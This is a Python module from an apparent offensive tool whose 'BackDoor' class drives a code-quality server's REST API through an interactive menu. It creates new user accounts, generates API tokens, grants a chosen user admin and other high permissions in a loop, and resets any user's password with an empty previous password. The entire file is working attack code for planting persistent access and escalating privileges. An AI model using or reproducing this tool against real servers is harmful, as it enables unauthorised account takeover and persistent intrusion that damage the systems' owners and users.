from views.SonarViews import SonarViews as sViews
import random

class BackDoor():
    def __init__(self, url, request):
        self.url = url
        self.request = request
        print(sViews.BACKDOOR_START)
        self.loadMenu()
    
    def loadMenu(self): 
        sViews.menuBackdoor()
        print(sViews.QUANTITY_BEGIN, end="")
        opt = int(input("  [|] Input option: "))
        print(sViews.QUANTITY_END, end="")
        
        if(opt >= 0 and opt <= 4):
            if(opt == 1):
                self.createUser()
            elif(opt == 2):
                self.generateToken()
            elif(opt == 3):
                self.privilageEscalation()
            elif(opt == 4):
                self.changePassword()
            else:
                exit(0)
        else:
            print(sViews.BACKDOOR_MENU_ERROR)
            self.loadMenu()


    def createUser(self):
        endpoint = self.url + "api/users/create"

        print(sViews.QUANTITY_BEGIN, end="")
        name = input("  [|] Enter Name (visible): ")
        username = input("  [|] Enter username (visible): ")
        email = input("  [|] Enter email (visible): ")
        password = input("  [|] Enter password: ")
        print(sViews.QUANTITY_END, end="")

        dload = {"name": name,
                "login": username,
                "email": email,
                "password": password}
        resp = self.request.post(endpoint, data=dload)
        if(resp.status_code == 200):
            print(sViews.BACKDOOR_CREATED_USER)
        else:
            self._errorCode(resp.status_code)

    def generateToken(self):
        print(sViews.QUANTITY_BEGIN, end="")
        name = input("  [|] Enter Name Token (visible): ")
        print(sViews.QUANTITY_END, end="")

        endpoint = self.url + "api/user_tokens/generate"
        dload = {"name": name}
        resp = self.request.post(endpoint, data=dload)
        if(resp.status_code == 200):
            data = resp.json()
            print(sViews.BACKDOOR_TOKEN_GEN + data["token"])
        else:
            self._errorCode(resp.status_code)
    
    def privilageEscalation(self):
        permissions = ["admin", "profileadmin", "gateadmin", "scan", "provisioning"]
        endpoint = self.url + "api/permissions/add_user"

        print(sViews.QUANTITY_BEGIN, end="")
        username = input("  [|] Enter username to elevated: ")
        print(sViews.QUANTITY_END, end="")

        for perm in permissions:
            dload = {
                "login": username,
                "permission": perm
            }
            resp = self.request.post(endpoint, data=dload)
            if(resp.status_code == 204):
                print(sViews.BACKDOOR_PERMISSIONS_OK + perm)
            else:
                print(sViews.BACKDOOR_PERMISSIONS_ERROR + perm)

    def changePassword(self):
        endpoint = self.url + "api/users/change_password"

        print(sViews.QUANTITY_BEGIN, end="")
        username = input("  [|] Enter username: ")
        password = input("  [|] Enter new password: ")
        print(sViews.QUANTITY_END, end="")

        dload = {
            "login": username,
            "password": password,
            "previousPassword": ""
        }

        resp = self.request.post(endpoint, data=dload)
        if(resp.status_code == 204):
            print(sViews.BACKDOOR_CHANGE_PWD_OK)
        elif(resp.status_code == 400):
            print(sViews.BACKDOOR_CHANGE_PWD_400)
        else:
            self._errorCode(resp.status_code)
    
    def _errorCode(self, code):
        opt = {
            400 : sViews.BACKDOOR_ERROR_400,
            401 : sViews.BACKDOOR_ERROR_401,
            403 : sViews.BACKDOOR_ERROR_403,
            1 : sViews.BACKDOOR_ERROR
        }
        if(opt.get(code)):
            print(opt[code])
        else:
            print(opt[1])